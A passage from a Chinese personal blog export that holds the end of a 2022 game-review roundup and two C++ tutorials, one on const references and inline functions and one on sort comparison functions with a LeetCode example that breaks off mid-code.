<p>国民级 jrpg 系列的最新作品，各方面都非常均衡，角色构筑、战斗系统、隐藏要素的设计已经相当成熟。给我印象最深刻的还是本作的数值设计，将游戏流程的难度曲线设置的非常平缓，正常推进流程的情况下，既不会让战斗太过困难，也不会让战斗太过简单，整体战斗节奏非常舒适。剧情部分虽然较为王道，但人物性格塑造不错，能够让人代入其中，同时也有诸如人鱼的故事这样动人的剧情。</p>
<p>本作作为传统 jrpg 给我的感觉就是一切做的都很不错，但总感觉还差那么一口气，整体上设计还是过于保守，没有让我感到特别惊艳的地方。同时很多设计放在今天来看确实有点过时了，主要还是大量无聊的重复劳动，尽管特别的二周目剧情算是一个亮点，但也意味着要重新体验一遍几乎一样的流程，放在今天确实是很难以让人坚持的。另外本作的配乐由于大量沿用了以往作品的配乐，原创配乐不多，虽然单听确实还不错，但与游戏本身的故事结合并不好，在城镇重复的交响乐反倒让人感觉很吵。</p>
<p>用一句话总结本作：如果 jrpg 设计有模板的话，那就应该是这样，一切都是传统的味道。但我个人还是希望系列能够在保留 jrpg 传统设计的同时，尽可能加入一些符合现代游戏设计理念的元素。</p>
<h1 id="女神异闻录5-皇家版"><a href="#女神异闻录5-皇家版" class="headerlink" title="女神异闻录5 皇家版"></a>女神异闻录5 皇家版</h1><p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/p5r1.jpg"></p>
<p>本作其实是从去年 8 月份开的坑，期间由于种种原因搁置了，直到今年才真正通关，总游戏时长约 100 小时。</p>
<p>本作可以说是现在综合素质最优秀的 jrpg 作品之一了，jrpg 核心的音乐、人设、对白、战斗系统各方面都非常优秀，几乎很难找出缺点。尤其要吹一吹本作的 UI 设计，在本身具备极佳的美观性和时髦值的同时，又拥有很强的实用性。具体体现在游戏中的很多菜单切换都非常合理且便捷，尤其是战斗时的按键操作被很好的简化，配上本作相较于传统 jrpg 快节奏的战斗与炫酷流畅的演出效果，使得原本较为重复的回合制战斗显得毫不枯燥乏味。</p>
<p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/p5r2.jpg"></p>
<p>对于 Persona 系列这种按日期来推进游戏流程的游戏模式，开始时还觉得节奏较慢，内容重复且限制较多，但越玩到后面越喜欢，精心设计的不少诙谐幽默的对话使得日常部分非常轻松而又有趣。此外，系列发展到第五代，其标志性的面具合成系统已经非常成熟，兼具深度和趣味性，在天鹅绒房间听着《全ての人の魂の诗》纠结面具的合成选择已经成了游戏中后期的常态。同时本作的迷宫设计也非常优秀，不仅迷宫本身的关卡设计过硬，且各迷宫风格迥异的美术设计与叙事部分结合的非常好。轻松的日常与优秀的战斗两者相结合就使得是本作如此让人沉迷。</p>
<p>夸了这么多，但我对本作不满的地方也不是没有，主要是角色羁绊部分做得还不够完善，角色的羁绊剧情基本上和游戏主线是两个世界，既不会受到主线的限制也对主线几乎没有影响，而且羁绊的剧情部分也乏善可陈。但也可以理解，这方面想做好确实比较困难，但我还是期待未来的六代能够在这方面有所改进。</p>
<p>综合来讲本作绝对是我最喜欢的 jrpg 作品之一，同时也是近年最好的 jrpg 之一。</p>
<h1 id="最终幻想13-2"><a href="#最终幻想13-2" class="headerlink" title="最终幻想13-2"></a>最终幻想13-2</h1><p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/ff1.jpg"></p>
<p>个人“最终幻想补完计划”的又一部作品，之前有尝试过 ff13 本篇，但由于较为无趣的战斗系统和过于死板的单线流程而弃坑，本来对这一作并不抱太大期望，没想到意外的还不错。</p>
<p>作为《最终幻想》正传系列作品，音画表现必然不会拉跨，尽管本作还是发售于 2011 年的 ps3 时代的老游戏，但其画面素质依然不逊色于如今大多数日系厂商的最新作品。我尤其偏爱本作的音乐风格，将系列一贯的幻想风格与本作的科技感很好的结合，放在今天依然非常惊艳。</p>
<p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/ff2.jpg"></p>
<p>13 本篇或许是由于过于注重技术力和演出效果把 rpg 的核心系统给丢了，本作在这方面有很大的改进：更加富有策略性的战斗系统和具备很大构筑空间的怪物系统让本作的战斗具备一定深度。前作单线流程部分给人的感觉就是沿着单行道前往一个新的场景，路途中打个怪再播个片，反复循环，即便流程存在一些岔路，但也基本不存在任何关卡设计。而本作在一开始就把空间上的限制放开，新颖的时间穿越系统不仅很好的为叙事服务，而且还赋予本作很强的探索空间，找回了 jrpg 本源的冒险感。虽然 rpg 部分的设计还称不上优秀，但整体的体验还是不错的。</p>
<p>最后稍微提一嘴本作的剧本，或者说是整个 ff13 三部曲的剧本。ff13 系列的世界观太过庞大且复杂，而且叙事又很隐晦，整体玩下来让人一头雾水，很多地方的情节又缺乏逻辑。ff13，包括个人特别喜欢的 ff15 这两代的剧本部分感觉路越走越偏了，世界观设定新奇且华丽，但剧情本身和人物塑造部分却非常空洞，远不及以往作品给人的印象深刻。希望 ff16 在回归传统剑与魔法世界观后剧本部分能够回到正轨，重新找回系列最初给人的那份感动。</p>
<h1 id="弹丸论破-希望学园与绝望高中生"><a href="#弹丸论破-希望学园与绝望高中生" class="headerlink" title="弹丸论破 希望学园与绝望高中生"></a>弹丸论破 希望学园与绝望高中生</h1><p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/tr1.jpg"></p>
<p>本作也不是今年才开始玩的，之前就在 psv 上体验过一阵，感觉风格过于怪异就没往下玩，直到今年加入 xgp 之后才想着重新开坑。</p>
<p>正如上面所提到的，本作的风格和人设都很“怪”，初次上手的直观感受就是二次元浓度爆表，给人感觉这不是什么正经游戏。但在通关之后却发现本作在猎奇的外表下，藏着的却是一个正儿八经文字推理游戏的内核。推理部分和悬念设计非常优秀，看似荒诞胡闹的现象最终都会有一个明确的解释。另外必须夸一夸本作的人设，本作的人设虽然很多时候过于浮夸，但这样做的好处是能够给玩家留下深刻的印象，玩家能在脑海中对每个人物有一个感性的认识，制作组也很好地利用了这一点，在推理环节给玩家设置了重重陷阱，让人惊觉脑洞之大。</p>
<p>系列的定位是“高速推理游戏”，各种花里胡哨的辩论效果让人眼前一亮，但随之附带的动作系统个人却不太能接受，不过好在游戏提供了简易模式。总的来说，只要能接受本作猎奇的设定，同时还对文字推理游戏感兴趣的话，本作还是一部不容错过的作品。</p>
<h1 id="赛博朋克2077"><a href="#赛博朋克2077" class="headerlink" title="赛博朋克2077"></a>赛博朋克2077</h1><p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/cp1.jpg"></p>
<p>原本在宣发阶段还以为是一个赛博朋克式的 gta，但事实上本作还是一个典型的 cdpr 式的作品，一个以跌宕起伏的故事和多样的分支选择为核心的 rpg.</p>
<p>优点自不必多说，《巫师3》在叙事上的优秀表现在这一代得到了很好的继承，多样且戏剧化的支线任务遍布了整个夜之城。同时，本作相较于《巫师3》相比同类游戏较弱的演出效果，极大地强化了主线流程的表现力，加之第一人称下更强的代入感和优秀的中文配音的加入，主线剧情的表现力绝对可以说是超一流的水准，整体的叙事表现相较于《巫师3》又有了长足的进步。</p>
<p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/cp2.jpg"></p>
<p>但或许是 cdpr 第一次尝试以现代都市为背景的开放世界，本作的开放世界的设计简直是无聊至极，整个城市构建的毫无真实感可言，愚蠢的路人 AI 和过少的交互元素都让这个偌大的夜之城难以让人沉浸。另外 rpg 的系统上个人认为也不那么有趣，尽管《巫师3》的整个 rpg 系统也不算优秀，但至少也存在像装备藏宝图这样很具探索感的设计，但本作的整个装备构筑部分个人基本找不到什么可玩点。可能我是一个更偏向于日系游戏的玩家，很难接受美式 rpg 中过于冗杂的装备系统，体现在本作中就是一场战斗下来捡了一堆武器，但事实上能用的寥寥无几，大多数都是留着卖钱的垃圾，不同武器所带来的数值提升也显得非常随意，很难体会到 jrpg 中那种角色能力成长所带来的数值之美。整个流程的战斗系统我基本上都没怎么研究，就这么硬着头皮通关了游戏，这部分的内容对我来说相较于《巫师3》是完全倒退的。</p>
<p>事实上本作也不是今年才接触的，当时还没有买新主机的时候就早早预购了游戏的 ps4 版本，最后的结果就不必多说了，游戏的首发版本不仅 bug 多到令人发指，而且在上世代主机上基本是一个不可玩的状态，最后不得已卖掉了二手盘。直到今年次世代更新的发布，我又在 xbox 上买了一份，xss 上能以 1080p 动态分辨率以 60 帧稳定运行，体验已经很不错了，但即便如此，我在整个游戏流程中遇到的 bug 依然高于大多数游戏的首发版本，可见当初首发坚持通关的玩家经历了什么…</p>
<h1 id="灵魂旅者"><a href="#灵魂旅者" class="headerlink" title="灵魂旅者"></a>灵魂旅者</h1><p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/sf1.jpg"></p>
<p>一款非常温暖治愈的游戏，游戏的基本内容是玩家扮演一名灵魂摆渡人，寻找散落在各个岛上的逝者灵魂，与他们互动，完成他们的心愿，并最终与他们告别。玩法部分简单描述就是模拟经营，玩家需要收集各种素材，为船上建造厨房、农场、果园等各种建筑，以此满足主线任务推进的需要。</p>
<p>游戏给人的初印象就是悠扬舒缓的音乐和精美的 2d 手绘画面，营造了一种非常温暖治愈的氛围。游戏最值得称道的还要属玩家与 npc 那极其细致的交互，船上的逝者灵魂并非只是每天等待着玩家的服务，他们每一位都在船上担当着一定的任务，包括加工麻线、制作点心等等。虽然这些机制实际上不会对玩家的任务有太大的影响，但却很好的加深了玩家与 npc 的羁绊，为最后的离别奠定了情感基础。当然，游戏在交互方面给我留下最深刻印象的，也是当初吸引我入坑的部分还是游戏独特的拥抱系统，与每位 npc 拥抱的动画做得非常生动细致，同时这一机制又贯穿于整个游戏，npc 在不开心时，玩家可以选择拥抱改善他的心情，最终离别的时刻，拥抱又是作为玩家与 npc 的最后一次互动而出现，兼具功能性和情感传达，可以说是整个游戏的点睛之笔。</p>
<p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/sf2.gif"></p>
<p>游戏的 gameplay 部分也很好的契合了游戏的舒缓节奏，素材的收集和加工并非一键完成，而是由各种小游戏所填充，包括砍树、冶炼、纺织都需要玩家手动来完成。但世上没有完美的设计，这一机制初见确实很有趣，但越到游戏后期，随着系统的愈发复杂和玩家的任务量的增加，就越能感到该系统所带来的疲惫感。其实整个《灵魂旅者》的游戏体验也是如此，在没有对各机制感到乏味时感觉特别惊艳，但后面过多的重复劳动还是很大程度上打消了玩家的热情，如果游戏能对流程进行一定程度的精简，想必体验上会好不少。</p>
<p>事实上本作我现在也还没有通关，但我想有时间一定会打完的。</p>
<h1 id="OPUS-龙脉常歌"><a href="#OPUS-龙脉常歌" class="headerlink" title="OPUS 龙脉常歌"></a>OPUS 龙脉常歌</h1><p><img src="/2023/01/12/2022%E5%B9%B4%E6%B8%B8%E6%88%8F%E6%80%BB%E7%BB%93/opus1.jpg"></p>
<p>这可能是我玩过最喜欢的叙事类游戏之一。</p>
<p>游戏由中国台湾工作室 Sigono Games 开发，故事的世界观设定新颖，很好地将中国神话与太空背景相结合，诸如名为“烛龙”的太阳和名为“大荒”的黑洞这样的称谓在游戏中大量存在，虽然整体体验下来这样的设定更多只是一个表皮，而且游戏的剧情本身与太空背景的结合也并不紧密，更像是一个披着科幻外衣的传统故事。但这丝毫不影响我对它的评价，能看到一个洋溢着中国传统文化的科幻故事本身就已经很满足了。</p>
<p>游戏的故事情节本身其实并不算有多么令人意外，甚至还有些俗套，部分情节显得过于巧合，甚至游戏的最终结局在开头就已告知玩家，但它还是凭借优秀的叙事和人物刻画让故事深入人心，成为我今年印象最为深刻的旅程。不同于很多西方和日式情节，本作男女主之间的感情表现的非常克制，而在这样克制的行为举动中玩家却能深刻的体会到他们的之间的羁绊，这种感觉很像之前《最终幻想9》给过我的感受，无需直接的言语表述便以深入人心。另外，限于游戏体量的大小，本作登场的角色数量并不算太多，但都塑造的各具特点，各人物在剧情的推动上都起到了或多或少的作用，绝无工具人的存在。</p>
<p>音乐部分也值得一提，本作音乐其实单拿出来听似乎并不算很好听，能给人留下印象的也不多，但与故事剧情的结合却非常好，音乐总会在剧情的某一关键节点响起，与制作组精心准备的演出相结合，给玩家带来足够的情感冲击。另外，本作现在的版本是加入了配音的，包括中文和日文配音，因为觉得台配的中文配音稍微有点出戏，就选择了日文配音。</p>
<p>我个人其实很少玩 galgame 那样的纯文字冒险游戏，即便它们中很多都有跌宕起伏的故事情节，但完全没有可操作部分也让我很难只为了故事本身而完成游戏流程。而像《龙脉常歌》这样的游戏模式我却很喜欢，本作也存在一些诸如模拟经营和解谜的玩法，但都设计的非常轻度，属于是故事情节与情节之间衔接的过渡元素，能够很好的调节游戏节奏。飞船虽然也有油量和耐久度的限定，但都在制作组的掌控之中，实际上只要按正常流程走基本不会出现数值见底的情况，这个限制的加入更多是为了营造星际航行时的紧张感，而非给玩家出的难题。gameplay 缺乏挑战和负担也可以让玩家更加专注于游戏所要传达的故事本身，而不至于因此分散了注意力，这也是前作《灵魂之桥》我觉得做得不够好的地方，“雪地探索捡垃圾”的玩法对于这类叙事游戏来说还是稍显繁琐。</p>
<p>本作我其实已经加入 steam 心愿单已久，却没想直接加入 xgp 了。通关了 xgp 的版本之后，出于对本作的喜爱，我又赶在 ns 版本打折的时候又买了一份，也算是对制作组的支持，希望它们的下一部作品能够做得更好。</p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>游戏</tag>
        <tag>闲谈</tag>
      </tags>
  </entry>
  <entry>
    <title>C++代码优化 Chapter2</title>
    <url>/2022/04/12/C++%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96%20Chapter2/</url>
    <content><![CDATA[<p>本文将继续介绍一些常见的 C++ 代码优化技巧，本文为该系列的第二章，未来不定期更新。</p>
<span id="more"></span>

<h1 id="非必要时使用常量引用"><a href="#非必要时使用常量引用" class="headerlink" title="非必要时使用常量引用"></a>非必要时使用常量引用</h1><p>在上一章我们介绍了在进行函数的参数传递时，尤其对于所占内存空间较大的参数的传递，为了避免拷贝所带来的不必要的性能开销，应当尽量使用引用传递。并且，当该函数不需要对传入的参数进行更改时，应当在参数类型前添加 <strong>const</strong> 关键字表示这是一个常量引用。</p>
<p>可能有朋友认为这里的 const 关键字的添加并不是必要的，但这样会带来两个问题：首先便是程序的可读性的下降，如果不添加 const 关键字，用户可能会认为该函数的变量是可更改的。其次它还将导致<strong>字面值</strong>将无法作为该函数的参数进行传递。所谓字面值，就是指代码中用数字或字符直接表示出来的常量（例如 <code>1</code>, <code>&quot;hello world&quot;</code>），这部分数据嵌入在程序中，当程序运行时被复制到内存的常量区，该区域为只读区域。示例如下：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">findChar</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> s<span class="token punctuation">,</span> <span class="token keyword">char</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span>
			<span class="token keyword">return</span> i<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">auto</span> ind <span class="token operator">=</span> <span class="token function">findChar</span><span class="token punctuation">(</span><span class="token string">"constant reference"</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 编译出错</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>以上实例中 <code>findChar()</code> 函数功能为在字符串 s 中寻找字符 target 并返回第一个 target 字符的下标，若未找到，则返回 -1. </p>
<p>当用实参初始化形参时，会忽略掉顶层的 const（即修饰整个变量类型的 const）。因此，当形参包含顶层 const 时，实参类型既可以是常量类型，也可以是非常量类型。但如果形参不含顶层 const，正如上例所示，它将无法接收常量类型或者字面值类型，这样将很大程度上限制该函数的适用范围，同时还可能会导致一些意想不到的错误。</p>
<p>正确的做法应该是在类型前添加 const 关键字，<code>int findChar(const std::string&amp; s, char target)</code></p>
<h1 id="使用内联函数替代复杂条件表达式"><a href="#使用内联函数替代复杂条件表达式" class="headerlink" title="使用内联函数替代复杂条件表达式"></a>使用内联函数替代复杂条件表达式</h1><p>我们在编写程序时可能会遇到需要使用复杂的条件表达式的情况，例如 <code>std::string s = s1.size() &gt; s2.size() ? s1 : s2;</code> ，这是一个常规的布尔表达式，作用是得到字符串 s1 和字符串 s2 中长度较小的一个。这样写固然没错，但可读性不佳，尤其当该表达式需要被反复使用时。</p>
<p>因此可以考虑将该表达式的操作定义为一个函数，如下所示：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>string <span class="token function">longerStr</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> s1<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> s2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> s1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> s2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s1 <span class="token operator">:</span> s2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>但是函数调用过程由于涉及到参数拷贝以及上一个调用函数的上下文保存，本身就存在一定的开销。那有没有一种办法使得该表达式操作即被封装成函数，又不会带来不必要的性能开销呢？内联函数就能够达成这样的目的。</p>
<p>内联函数会在编译期间会将函数体直接在所有函数调用位置处展开，这样运行效率就与条件表达式无异了。将函数声明为内联函数的方法是在函数返回值类型前添加 <strong>inline</strong> 关键字。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">inline</span> std<span class="token double-colon punctuation">::</span>string <span class="token function">longerStr</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> s1<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> s2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> s1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> s2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s1 <span class="token operator">:</span> s2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 编译期间展开为 std::string s = s1.size() > s2.size() ? s1 : s2;</span>
std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token function">longerStr</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>这其实与 C 语言中的宏定义操作类似：<code>#define LS(s1, s2) s1.size() &gt; s2.size() ? s1 : s2</code>，但宏定义是十分简单的文本替换，它不会执行<strong>类型检查</strong>，导致的错误可能会十分隐蔽，因此在现代 C++ 程序中应当尽量避免使用宏定义。</p>
<p>值得注意的是，内联函数通常只适用于函数体较短，逻辑较为简单的函数，通常函数体不超过 10 行。同时，对于一个多文件的程序，内联函数的定义通常直接位于头文件中，而不应先在头文件中声明，再在 cpp 文件中定义。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++比较函数cmp</title>
    <url>/2021/11/19/C++%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0cmp/</url>
    <content><![CDATA[<p>本文将简单介绍C++比较函数 cmp.</p>
<h1 id="排序函数sort"><a href="#排序函数sort" class="headerlink" title="排序函数sort()"></a>排序函数sort()</h1><p>sort函数是我们常用的库函数，它的参数如下：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">sort</span> <span class="token punctuation">(</span>RandomAccessIterator first<span class="token punctuation">,</span> RandomAccessIterator last<span class="token punctuation">,</span> Compare cmp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>通过传入容器的迭代器（或指针），我们可以对指定位置进行排序：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//排序得到nums = &#123; 1,2,3,4,5 &#125;</span></code></pre>

<p>可见，sort 函数的比较函数 cmp 默认参数为升序排列，当然也可以自定义函数来实现不同的排序方法。</p>
<h1 id="比较函数cmp"><a href="#比较函数cmp" class="headerlink" title="比较函数cmp()"></a>比较函数cmp()</h1><h2 id="自定义比较函数"><a href="#自定义比较函数" class="headerlink" title="自定义比较函数"></a>自定义比较函数</h2><p>首先编写一个示例用以解释：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">MyStruct</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> weigth<span class="token punctuation">;</span>
    string str<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">bool</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> MyStruct<span class="token operator">&amp;</span> ms1<span class="token punctuation">,</span> <span class="token keyword">const</span> MyStruct<span class="token operator">&amp;</span> ms2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> ms1<span class="token punctuation">.</span>weight <span class="token operator">&lt;</span> ms2<span class="token punctuation">.</span>weight<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    vector<span class="token operator">&lt;</span>MyStruct<span class="token operator">></span> msVector<span class="token punctuation">;</span>
    <span class="token function">sort</span><span class="token punctuation">(</span>msVector<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msVector<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>一般来说，cmp 函数具有以下规范：</p>
<ol>
<li>返回值为 bool 类型，用来表示当前的排序是否正确。</li>
<li>参数为两个相同类型的变量，且类型与要排序的容器模板类型相同。</li>
</ol>
<p>关于 cmp 作为比较函数实现排序的原理，可以这样来进行理解：在示例中，ms1 和 ms2 是两个参数，即 msVector 容器中的元素，且此时 ms1 位于 ms2 之前，此时函数的返回值其实就是给出此时排序的正确性。若正确则返回 true，反之返回 false。例如在示例中，该比较函数想要实现 MyStruct 结构体元素按照其 weight 值从小到大进行排列，因此返回值为 ms1.weight &lt; ms2.weight。ms1 位于 ms2 之前，若 ms1.weight &lt; ms2.weight，则返回 true，反之返回 false，与我们的预期相同。</p>
<h2 id="标准库比较函数"><a href="#标准库比较函数" class="headerlink" title="标准库比较函数"></a>标准库比较函数</h2><p>如果只是想实现简单的容器的升序或者降序排列，可以直接使用 C++ 标准库中的比较函数：<code>greater()</code> 和 <code>less()</code>，顾名思义，它们分别实现的是降序和升序排列。以下为使用示例：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">greater</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//排序得到nums = &#123; 5,4,3,2,1 &#125;</span>
<span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">less</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//排序得到nums = &#123; 1,2,3,4,5 &#125;</span></code></pre>

<p>由此不难发现，sort 函数中 cmp 的默认参数就是 <code>less&lt;Type&gt;()</code>.</p>
<h2 id="简化比较函数"><a href="#简化比较函数" class="headerlink" title="简化比较函数"></a>简化比较函数</h2><p>对于一个简单的比较函数，我们可以使用 <strong>lambda 表达式</strong>来对代码进行简化。（有关 lambda 表达式的内容，可以参考<a href="https://www.cnblogs.com/DswCnblog/p/5629165.html">C++ 11 Lambda表达式</a>）</p>
<p>使用 lambda 表达式，我们可以将“自定义比较函数”处的示例简化。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">sort</span><span class="token punctuation">(</span>msVector<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msVector<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> MyStruct<span class="token operator">&amp;</span> ms1<span class="token punctuation">,</span> <span class="token keyword">const</span> MyStruct<span class="token operator">&amp;</span> ms2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> ms1<span class="token punctuation">.</span>weight <span class="token operator">&lt;</span> ms2<span class="token punctuation">.</span>weight<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>题目链接：<a href="https://leetcode-cn.com/problems/maximum-product-of-word-lengths/">最大单词长度乘积</a></p>
<p>对于本题，比较容易想到的是暴力解法，但是直接进行暴力求解将会进行大量的无效计算。因此考虑将数组 words 按其元素的 string 长度从大到小进行排序，并依次两两判断是否是有效解，将有效解保存，在之后的遍历中若当前两 string 长度乘积不大于已保存的解，则立即终止当前循环。</p>
<p>而将数组 words 按其元素的 string 长度从大到小进行排序这一过程，就用到了 sort 函数以及自定义比较函数。</p>
<p>以下为解题代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">bool</span> <span class="token function">isLegal</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> s1<span class="token punctuation">,</span> <span class="token keyword">const</span> string<span class="token operator">&amp;</span> s2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> ch1 <span class="token operator">:</span> s1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
